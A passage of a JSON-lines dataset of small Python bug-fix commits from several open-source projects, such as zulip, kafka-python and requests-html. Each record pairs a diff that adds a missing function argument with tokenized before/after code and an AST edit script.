"edit_script": "[[\"Insert\", [\"argument_list\", 3, 14, 3, 19], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 14, 3, 19], [\"string:'rb'\", \"T\"], 3]]"}
{"project": "cvxpy", "commit_sha": "33cb84c5b92123a2e41c0b9da795a60948ff5181", "parent_sha": "04ebf18291d6941f7a0283af08da9888d38a5700", "file_path": "cvxpy/interface/numpy_interface/sparse_matrix_interface.py", "project_url": "https://github.com/zqcr/cvxpy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -57,7 +57,7 @@ class SparseMatrixInterface(NDArrayInterface):\n     def identity(self, size):\n         \"\"\"Return an identity matrix.\n         \"\"\"\n-        return sp.eye(size, format=\"csc\")\n+        return sp.eye(size, size, format=\"csc\")\n \n     def size(self, matrix):\n", "before": "return sp . eye ( size , format = \"csc\" )", "after": "return sp . eye ( size , size , format = \"csc\" )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 22, 3, 42], [\"identifier:size\", \"T\"], 3], [\"Insert\", [\"argument_list\", 3, 22, 3, 42], [\",:,\", \"T\"], 4]]"}
{"project": "zulip", "commit_sha": "61a33f4c4ddece92e1ce8dc98055e1abbd7ebab7", "parent_sha": "dc8bc9e1af5b67b2bcc49f22b050279342264f3b", "file_path": "zephyr/lib/bugdown/__init__.py", "project_url": "https://github.com/punit-agarwal/zulip", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -48,7 +48,7 @@ def convert(md):\n             safe_mode     = 'escape',\n             output_format = 'xhtml',\n             extensions    = ['fenced_code', 'nl2br',\n-                codehilite.makeExtension(),\n+                codehilite.makeExtension(configs=[('force_linenos', False)]),\n                 Bugdown()])\n \n     md = _link_regex.sub(_linkify, md)\n", "before": "extensions = [ 'fenced_code' , 'nl2br' , codehilite . makeExtension ( ) , Bugdown ( ) ] ) md = _link_regex . sub ( _linkify , md )", "after": "extensions = [ 'fenced_code' , 'nl2br' , codehilite . makeExtension ( configs = [ ( 'force_linenos' , False ) ] ) , Bugdown ( ) ] ) md = _link_regex . sub ( _linkify , md )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 41, 3, 43], [\"keyword_argument\", \"N0\"], 1], [\"Insert\", [\"argument_list\", 3, 41, 3, 43], [\"):)\", \"T\"], 2], [\"Insert\", \"N0\", [\"identifier:configs\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"list\", \"N1\"], 2], [\"Insert\", \"N1\", [\"[:[\", \"T\"], 0], [\"Insert\", \"N1\", [\"tuple\", \"N2\"], 1], [\"Insert\", \"N1\", [\"]:]\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"string:'force_linenos'\", \"T\"], 1], [\"Insert\", \"N2\", [\",:,\", \"T\"], 2], [\"Insert\", \"N2\", [\"false:False\", \"T\"], 3], [\"Move\", \"N2\", [\"):)\", 3, 42, 3, 43], 4]]"}
{"project": "zulip", "commit_sha": "87c5ace24dbda88cc0fb90c7068f5fa59ceddf8b", "parent_sha": "521e8700d7a0e7a03e175d7f4a63c7a050d14389", "file_path": "zerver/management/commands/makemessages.py", "project_url": "https://github.com/punit-agarwal/zulip", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -246,4 +246,4 @@ class Command(makemessages.Command):\n \n             new_strings = self.get_new_strings(old_strings, translation_strings)\n             with open(output_path, 'w') as writer:\n-                json.dump(new_strings, writer, indent=2)\n+                json.dump(new_strings, writer, indent=2, sort_keys=True)\n", "before": "json . dump ( new_strings , writer , indent = 2 )", "after": "json . dump ( new_strings , writer , indent = 2 , sort_keys = True )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 26, 3, 57], [\",:,\", \"T\"], 6], [\"Insert\", [\"argument_list\", 3, 26, 3, 57], [\"keyword_argument\", \"N0\"], 7], [\"Insert\", \"N0\", [\"identifier:sort_keys\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"true:True\", \"T\"], 2]]"}
{"project": "pulp_rpm", "commit_sha": "e4eebadb39bcb0a7933621e37bd891e6add71c83", "parent_sha": "842c0ed9ea2fd539fd5ba9ca7a33c65c897ae26f", "file_path": "pulp_rpm/tests/functional/api/test_consume_content.py", "project_url": "https://github.com/ATIX-AG/pulp_rpm", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -84,7 +84,7 @@ class PackageManagerConsumeTestCase(unittest.TestCase):\n         baseurl = urljoin(self.cfg.get_content_host_base_url(),\n                           '//' + distribution['base_url'])\n         cli_client = cli.Client(self.cfg)\n-        cli_client.run(('dnf', 'config-manager', '--add-repo', baseurl))\n+        cli_client.run(('dnf', 'config-manager', '--add-repo', baseurl), sudo=True)\n         repo_id = '*{}'.format(distribution['base_path'])\n         cli_client.run(('dnf', 'config-manager', '--save',\n                         '--setopt=gpgcheck=0', repo_id))\n", "before": "cli_client . run ( ( 'dnf' , 'config-manager' , '--add-repo' , baseurl ) )", "after": "cli_client . run ( ( 'dnf' , 'config-manager' , '--add-repo' , baseurl ) , sudo = True )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 23, 3, 73], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 23, 3, 73], [\"keyword_argument\", \"N0\"], 3], [\"Insert\", \"N0\", [\"identifier:sudo\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"true:True\", \"T\"], 2]]"}
{"project": "h", "commit_sha": "91db0fdcd8cbc58c87442cf4c6e0de0c5f4b07b9", "parent_sha": "b85a8e5ec19613ccb8a0efd16406ca26d26ac2eb", "file_path": "h/views.py", "project_url": "https://github.com/project-star/h", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -44,7 +44,7 @@ class Annotation(BaseController):\n         request = self.request\n         context = request.context\n         if len(context) == 0:\n-            raise httpexceptions.HTTPNotFound()\n+            raise httpexceptions.HTTPNotFound(body_template=\"Either no annotation exists with this identifier, or you don't have the permissions required for viewing it.\")\n \n         d = context._url_values()\n         d['annotation'] = context\n", "before": "raise httpexceptions . HTTPNotFound ( )", "after": "raise httpexceptions . HTTPNotFound ( body_template = \"Either no annotation exists with this identifier, or you don't have the permissions required for viewing it.\" )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 46, 3, 48], [\"keyword_argument\", \"N0\"], 1], [\"Insert\", \"N0\", [\"identifier:body_template\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"string:\\\"Either no annotation exists with this identifier, or you don't have the permissions required for viewing it.\\\"\", \"T\"], 2]]"}
{"project": "traitsgui", "commit_sha": "17608aebaefe071a836d7d5fdd7acc639032989d", "parent_sha": "226b4cbbff9ef8b2a84f75a5ea2b0ba029a74b68", "file_path": "examples/workbench/example_workbench_window.py", "project_url": "https://github.com/enthought/traitsgui", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -184,7 +184,7 @@ class ExampleWorkbenchWindow(WorkbenchWindow):\n         # Using an initializer makes sure that every window instance gets its\r\n         # own view instances (which is necessary since each view has a\r\n         # reference to its toolkit-specific control etc.).\r\n-        return [factory() for factory in self.view_factories]\r\n+        return [factory(window=self) for factory in self.view_factories]\r\n \r\n     ###########################################################################\r\n     # Private interface.\r\n", "before": "return [ factory ( ) for factory in self . view_factories ]", "after": "return [ factory ( window = self ) for factory in self . view_factories ]", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 24, 3, 26], [\"keyword_argument\", \"N0\"], 1], [\"Insert\", \"N0\", [\"identifier:window\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:self\", \"T\"], 2]]"}
{"project": "UnivaqBot", "commit_sha": "afca19412606bb63de6ebff82027c118b04a8f9b", "parent_sha": "1e7349bc3e7282f6103d6d67949da60045d1f06c", "file_path": "libs/utils/utils.py", "project_url": "https://github.com/giacomocerquone/UnivaqBot", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -38,7 +38,7 @@ def write_json(data, json_file):\n     \"\"\"General function used everywhere to write data into a json file\"\"\"\n \n     with open(json_file, \"w\") as json_file:\n-        json.dump(data, json_file)\n+        json.dump(data, json_file, indent=4)\n \n def read_json(json_file):\n     \"\"\"General function used everywhere to read a json file\"\"\"\n", "before": "json . dump ( data , json_file )", "after": "json . dump ( data , json_file , indent = 4 )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 18, 3, 35], [\",:,\", \"T\"], 4], [\"Insert\", [\"argument_list\", 3, 18, 3, 35], [\"keyword_argument\", \"N0\"], 5], [\"Insert\", \"N0\", [\"identifier:indent\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"integer:4\", \"T\"], 2]]"}
{"project": "kafka-python", "commit_sha": "990e9285342dd921ddba472868dbd852a7b69689", "parent_sha": "8655c75e6a147080235d3458ec82edb9e1ff78a6", "file_path": "kafka/coordinator/consumer.py", "project_url": "https://github.com/DataDog/kafka-python", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -462,7 +462,7 @@ class ConsumerCoordinator(BaseCoordinator):\n         # its completion). Note that commits are treated as heartbeats by the\n         # coordinator, so there is no need to explicitly allow heartbeats\n         # through delayed task execution.\n-        self._client.poll() # no wakeup if we add that feature\n+        self._client.poll(timeout_ms=0) # no wakeup if we add that feature\n \n     def _do_commit_offsets_async(self, offsets, callback=None):\n         assert self.config['api_version'] >= (0, 8, 1), 'Unsupported Broker API'\n", "before": "self . _client . poll ( )", "after": "self . _client . poll ( timeout_ms = 0 )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 26, 3, 28], [\"keyword_argument\", \"N0\"], 1], [\"Insert\", \"N0\", [\"identifier:timeout_ms\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"integer:0\", \"T\"], 2]]"}
{"project": "curator", "commit_sha": "6b7a4f220d53e06473c17714c46d6e865f5784ca", "parent_sha": "8d0c6e18f82f83684463c66177bb97c5c973fcfe", "file_path": "curator/curator.py", "project_url": "https://github.com/mgmonteleone/curator", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -410,7 +410,7 @@ def main():\n     if arguments.optimize:\n         logger.info('Optimizing indices older than {0} {1}...'.format(arguments.optimize, arguments.time_unit))\n         expired_indices = find_expired_indices(client, time_unit=arguments.time_unit, unit_count=arguments.optimize, separator=arguments.separator, prefix=arguments.prefix)\n-        index_loop(client, 'optimize', expired_indices, arguments.dry_run)\n+        index_loop(client, 'optimize', expired_indices, arguments.dry_run, max_num_segments=arguments.max_num_segments)\n     # Required routing rules\n     if arguments.require:\n         logger.info('Updating required routing allocation rules on indices older than {0} {1}...'.format(arguments.require, arguments.time_unit))\n", "before": "index_loop ( client , 'optimize' , expired_indices , arguments . dry_run )", "after": "index_loop ( client , 'optimize' , expired_indices , arguments . dry_run , max_num_segments = arguments . max_num_segments )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 19, 3, 75], [\",:,\", \"T\"], 8], [\"Insert\", [\"argument_list\", 3, 19, 3, 75], [\"keyword_argument\", \"N0\"], 9], [\"Insert\", \"N0\", [\"identifier:max_num_segments\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:arguments\", \"T\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:max_num_segments\", \"T\"], 2]]"}
{"project": "lesswrong", "commit_sha": "b586c65b714fc34f84e38e287b251d349f2d4a42", "parent_sha": "b40b0a2e3265f4187b1a30f697f583571ca86f84", "file_path": "r2/r2/models/meetup.py", "project_url": "https://github.com/jimrandomh/lesswrong", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -22,7 +22,7 @@ class Meetup(Thing):\n \n   @classmethod\n   def upcoming_meetups_query(cls):\n-    return Meetup._query(Meetup.c.timestamp > time.time(), data=True)\n+    return Meetup._query(Meetup.c.timestamp > time.time(), data=True, sort=desc('_date'))\n \n   @classmethod\n   def upcoming_meetups_near(cls, location, max_distance, count = 5):\n", "before": "return Meetup . _query ( Meetup . c . timestamp > time . time ( ) , data = True )", "after": "return Meetup . _query ( Meetup . c . timestamp > time . time ( ) , data = True , sort = desc ( '_date' ) )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 25, 3, 70], [\",:,\", \"T\"], 4], [\"Insert\", [\"argument_list\", 3, 25, 3, 70], [\"keyword_argument\", \"N0\"], 5], [\"Insert\", [\"argument_list\", 3, 25, 3, 70], [\"):)\", \"T\"], 6], [\"Insert\", \"N0\", [\"identifier:sort\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"call\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:desc\", \"T\"], 0], [\"Insert\", \"N1\", [\"argument_list\", \"N2\"], 1], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"string:'_date'\", \"T\"], 1], [\"Move\", \"N2\", [\"):)\", 3, 69, 3, 70], 2]]"}
{"project": "kafka-python", "commit_sha": "8f0d1c1716205d82c8ee2c22baf60413936650c9", "parent_sha": "a766495355cdcc046566b4f96545c4d0f71cb7ec", "file_path": "kafka/coordinator/consumer.py", "project_url": "https://github.com/DataDog/kafka-python", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -443,7 +443,7 @@ class ConsumerCoordinator(AbstractCoordinator):\n                     return\n                 else:\n                     log.error(\"OffsetCommit failed for group % on partition %s\"\n-                              \" with offset %s: %s\", tp, offset,\n+                              \" with offset %s: %s\", self.group_id, tp, offset,\n                               error_type.__name__)\n                     future.failure(error_type())\n                     return\n", "before": "else : log . error ( \"OffsetCommit failed for group % on partition %s\" \" with offset %s: %s\" , tp , offset , error_type . __name__ )", "after": "else : log . error ( \"OffsetCommit failed for group % on partition %s\" \" with offset %s: %s\" , self . group_id , tp , offset , error_type . __name__ )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 2, 30, 4, 51], [\"attribute\", \"N0\"], 3], [\"Insert\", [\"argument_list\", 2, 30, 4, 51], [\",:,\", \"T\"], 4], [\"Insert\", \"N0\", [\"identifier:self\", \"T\"], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:group_id\", \"T\"], 2]]"}
{"project": "requests-html", "commit_sha": "9ed0bac87b1edaed3da31374679f3714269787ac", "parent_sha": "2aad96cead9ceac9f0b7eb2c6422365702446fff", "file_path": "requests_html.py", "project_url": "https://github.com/wuqiangroy/requests-html", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -117,7 +117,7 @@ class BaseParser:\n         \"\"\"`lxml <http://lxml.de>`_ representation of the\n         :class:`Element <Element>` or :class:`HTML <HTML>`.\n         \"\"\"\n-        return soup_parse(self.html)\n+        return soup_parse(self.html, features='html.parser')\n \n     @property\n     def text(self) -> _Text:\n", "before": "return soup_parse ( self . html )", "after": "return soup_parse ( self . html , features = 'html.parser' )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 26, 3, 37], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 26, 3, 37], [\"keyword_argument\", \"N0\"], 3], [\"Insert\", \"N0\", [\"identifier:features\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"string:'html.parser'\", \"T\"], 2]]"}
{"project": "requests-html", "commit_sha": "68697aa04f6b079c6d61496b4e569c0934211f2f", "parent_sha": "98dff4bfea661c73a90165ab0a250ab3e0a43165", "file_path": "requests_html.py", "project_url": "https://github.com/wuqiangroy/requests-html", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -399,7 +399,7 @@ class HTML(BaseParser):\n         for i in range(retries):\n             if not content:\n                 try:\n-                    content, result = loop.run_until_complete(_async_render(url=self.url, script=script, sleep=sleep, content=self.html, reload=reload, scrolldown=scrolldown, timeout=timeout))\n+                    content, result = loop.run_until_complete(_async_render(url=self.url, script=script, sleep=sleep, wait=wait, content=self.html, reload=reload, scrolldown=scrolldown, timeout=timeout))\n                 except TimeoutError:\n                     pass\n \n", "before": "content , result = loop . run_until_complete ( _async_render ( url = self . url , script = script , sleep = sleep , content = self . html , reload = reload , scrolldown = scrolldown , timeout = timeout ) )", "after": "content , result = loop . run_until_complete ( _async_render ( url = self . url , script = script , sleep = sleep , wait = wait , content = self . html , reload = reload , scrolldown = scrolldown , timeout = timeout ) )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 76, 3, 192], [\"keyword_argument\", \"N0\"], 7], [\"Insert\", [\"argument_list\", 3, 76, 3, 192], [\",:,\", \"T\"], 8], [\"Insert\", \"N0\", [\"identifier:wait\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:wait\", \"T\"], 2]]"}
{"project": "requests-html", "commit_sha": "4aab2b0f1f87309a0781fead43b02b481e0970f8", "parent_sha": "db87e4b8084966d9b1f6c72f225d13bf62d7eb3c", "file_path": "requests_html.py", "project_url": "https://github.com/wuqiangroy/requests-html", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -38,7 +38,7 @@ class BaseParser:\n         if self._html:\n             return self._html\n         else:\n-            return etree.tostring(self.element).decode(self.encoding).strip()\n+            return etree.tostring(self.element, 'unicode').decode(self.encoding).strip()\n \n     @html.setter\n     def set_html(self, html):\n", "before": "return etree . tostring ( self . element ) . decode ( self . encoding ) . strip ( )", "after": "return etree . tostring ( self . element , 'unicode' ) . decode ( self . encoding ) . strip ( )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 34, 3, 48], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 34, 3, 48], [\"string:'unicode'\", \"T\"], 3]]"}
{"project": "building-boundary", "commit_sha": "d1ad3a394615c8c45a95fb322b9b9c8a8670d42c", "parent_sha": "b466fe5c6d972db0c7effa3330418511c2e171b1", "file_path": "buildingboundary/utils/utils.py", "project_url": "https://github.com/Geodan/building-boundary", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -28,4 +28,4 @@ def create_segments(iterable):\n-    return zip(iterable, np.roll(iterable, -1))\n+    return zip(iterable, np.roll(iterable, -1, axis=0))\n", "before": "return zip ( iterable , np . roll ( iterable , - 1 ) )", "after": "return zip ( iterable , np . roll ( iterable , - 1 , axis = 0 ) )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 0, 33, 0, 47], [\",:,\", \"T\"], 4], [\"Insert\", [\"argument_list\", 0, 33, 0, 47], [\"keyword_argument\", \"N0\"], 5], [\"Insert\", \"N0\", [\"identifier:axis\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"integer:0\", \"T\"], 2]]"}
{"project": "fimax", "commit_sha": "699a2d87920c57dd428c055e4ab6bc511f0b2075", "parent_sha": "ec73b598ebf6a7eed124620c756421fba69bcc31", "file_path": "fimax/scheduler.py", "project_url": "https://github.com/YefriTavarez/fimax", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -113,7 +113,7 @@ def get_valid_loan_charges():\n \t\tWHERE loan_charges_type.generates_fine > 0\n \t\t\tAND TIMESTAMPDIFF(MONTH, loan_charges.modified, CURRENT_TIMESTAMP) > 0\n \t\t\tAND loan_charges.repayment_date < CURDATE()\n-\t\t\tAND loan_charges.status NOT IN ('Paid' , 'Closed')\"\"\",\n+\t\t\tAND loan_charges.status NOT IN ('Paid', 'Paused', 'Closed')\"\"\",\n \t\tas_dict=True)\n \n def update_loan_record(doc):\n", "before": "loan_charges . status NOT IN ( 'Paid' , 'Closed' ) \"\"\" ,", "after": "loan_charges . status NOT IN ( 'Paid' , 'Paused' , 'Closed' ) \"\"\" ,", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 35, 3, 54], [\"string:'Paused'\", \"T\"], 3], [\"Insert\", [\"argument_list\", 3, 35, 3, 54], [\",:,\", \"T\"], 4]]"}
{"project": "pulsar", "commit_sha": "2903fb6159bbd1f6e8a31d9eb28ec13a3ac56a45", "parent_sha": "af9cc20573741ab929efe596749d32542faa953b", "file_path": "pulsar/async/iostream.py", "project_url": "https://github.com/winggynOnly/pulsar", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -18,7 +18,7 @@ def make_callback(callback, description = None):\n     if is_async(callback):\n         return callback\n     d = Deferred(description = description)\n-    return d.add_callback(callback)\n+    return d.add_callback(callback, True)\n \n \n class IOStream(object):\n", "before": "return d . add_callback ( callback )", "after": "return d . add_callback ( callback , True )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 26, 3, 36], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 26, 3, 36], [\"true:True\", \"T\"], 3]]"}
{"project": "rasberry_pi_photo_booth", "commit_sha": "1d029238aa33aa788c5f89e475bbfa3df184cad3", "parent_sha": "1223312fd261b0304e2433163ec9b78f24a2d0e8", "file_path": "camera.py", "project_url": "https://github.com/jibbius/rasberry_pi_photo_booth", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -231,7 +231,7 @@ def prep_for_photo_screen(photo_number):\n \n     #Get ready for the next photo\n     get_ready_image = REAL_PATH + '/assets/get_ready_' + str(photo_number) + '.png'\n-    overlay_image(get_ready_image, PREP_DELAY, 'RGBA')\n+    overlay_image(get_ready_image, PREP_DELAY, 3, 'RGBA')\n \n def taking_photo(photo_number, filename_prefix):\n", "before": "overlay_image ( get_ready_image , PREP_DELAY , 'RGBA' )", "after": "overlay_image ( get_ready_image , PREP_DELAY , 3 , 'RGBA' )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 18, 3, 55], [\"integer:3\", \"T\"], 5], [\"Insert\", [\"argument_list\", 3, 18, 3, 55], [\",:,\", \"T\"], 6]]"}
{"project": "sublime_terminal", "commit_sha": "b85e70bfaf53c94d71fc9220e81574082e7ef96f", "parent_sha": "e27877659b995b58d06d9d0c0a4bba680b975c37", "file_path": "Terminal.py", "project_url": "https://github.com/wbond/sublime_terminal", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -143,7 +143,7 @@ class TerminalCommand():\n             else:\n                 cwd = dir_.encode(encoding)\n \n-            env_setting = get_setting('env')\n+            env_setting = get_setting('env', {})\n             env = os.environ.copy()\n             for k in env_setting:\n                 if env_setting[k] is None:\n", "before": "env_setting = get_setting ( 'env' )", "after": "env_setting = get_setting ( 'env' , { } )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 38, 3, 45], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 38, 3, 45], [\"dictionary\", \"N0\"], 3], [\"Insert\", \"N0\", [\"{:{\", \"T\"], 0], [\"Insert\", \"N0\", [\"}:}\", \"T\"], 1]]"}
{"project": "large-events", "commit_sha": "61096829cce42acc74fe0a92e3fcad977ecb3f07", "parent_sha": "8d8563c37ccdd7697bf75bc2d5b76855716de8ed", "file_path": "events/app.py", "project_url": "https://github.com/knative-portability/large-events", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -78,7 +78,7 @@ def edit_event(event_id):\n def get_all_events():\n     \"\"\"Return a list of all events currently in the DB.\"\"\"\n     try:\n-        events = EVENTS_COLL.find()\n+        events = EVENTS_COLL.find({})\n         events = [Event(**ev).dict for ev in events]\n         events_dict = build_events_dict(events)\n         # TODO(cmei4444): test with pageserve to make sure the json format is\n", "before": "events = EVENTS_COLL . find ( )", "after": "events = EVENTS_COLL . find ( { } )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 34, 3, 36], [\"dictionary\", \"N0\"], 1], [\"Insert\", \"N0\", [\"{:{\", \"T\"], 0], [\"Insert\", \"N0\", [\"}:}\", \"T\"], 1]]"}
{"project": "large-events", "commit_sha": "6b0927cb230e7dd7cff3b66233f4e316d75d046e", "parent_sha": "be51d8f434a9d8266233e0a4f0a2025e0f997534", "file_path": "pageserve/app.py", "project_url": "https://github.com/knative-portability/large-events", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -109,7 +109,7 @@ def sign_out():\n-    session.pop(\"user\")\n+    session.pop(\"user\", None)\n     return redirect(url_for(\"index\"))\n \n \n", "before": "session . pop ( \"user\" )", "after": "session . pop ( \"user\" , None )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 0, 16, 0, 24], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 0, 16, 0, 24], [\"none:None\", \"T\"], 3]]"}
{"project": "pyslic3r", "commit_sha": "4c3bd17170d5a7a3a2ebe7c4520203ddc3db57e4", "parent_sha": "e56ebbca50be4247c6a033f09236ec62908910e9", "file_path": "pyclipper/plot2d.py", "project_url": "https://github.com/jdfr/pyslic3r", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -150,7 +150,7 @@ def object2Lines(obj, scalingFactor=0.00000001, sliceindex=None, linestyle=None)\n def contours2path(contours, scalingFactor=0.00000001):\n   \"\"\"helper function for object2DToPatches()\"\"\"\n   contours        = [n.vstack((c, c[0,:])) for c in contours] #close the contours\n-  sizes           = n.array([x.shape[0] for x in contours])\n+  sizes           = n.array([x.shape[0] for x in contours], dtype=int)\n   accums          = n.cumsum(sizes[:-1])\n   if len(contours)==0:\n     vertices      = n.empty((0,2))\n", "before": "sizes = n . array ( [ x . shape [ 0 ] for x in contours ] )", "after": "sizes = n . array ( [ x . shape [ 0 ] for x in contours ] , dtype = int )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 28, 3, 60], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 28, 3, 60], [\"keyword_argument\", \"N0\"], 3], [\"Insert\", \"N0\", [\"identifier:dtype\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:int\", \"T\"], 2]]"}
{"project": "hgvm-graph-bakeoff-evaluations", "commit_sha": "ce3ea86b4492210b81a14daba94fb6bdc77b37fc", "parent_sha": "7b2c83e2415d37957773224ab61a05340bf3fa74", "file_path": "scripts/toillib.py", "project_url": "https://github.com/BD2KGenomics/hgvm-graph-bakeoff-evaluations", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -533,7 +533,7 @@ class FileIOStore(IOStore):\n                 if with_times:\n                     # What is the mtime in seconds since epoch?\n                     mtime_epoch_seconds = os.path.getmtime(os.path.join(\n-                        input_path, item))\n+                        self.path_prefix, input_path, item))\n                     # Convert it to datetime\n                     mtime_datetime = datetime.datetime.utcfromtimestamp(\n                         mtime_epoch_seconds).replace(\n", "before": "mtime_epoch_seconds = os . path . getmtime ( os . path . join ( input_path , item ) )", "after": "mtime_epoch_seconds = os . path . getmtime ( os . path . join ( self . path_prefix , input_path , item ) )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Move\", [\"identifier:input_path\", 3, 25, 3, 35], [\"argument_list\", 2, 72, 3, 42], 2], [\"Insert\", [\"argument_list\", 2, 72, 3, 42], [\"attribute\", \"N0\"], 1], [\"Insert\", [\"argument_list\", 2, 72, 3, 42], [\",:,\", \"T\"], 3], [\"Insert\", \"N0\", [\"identifier:self\", \"T\"], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:path_prefix\", \"T\"], 2]]"}
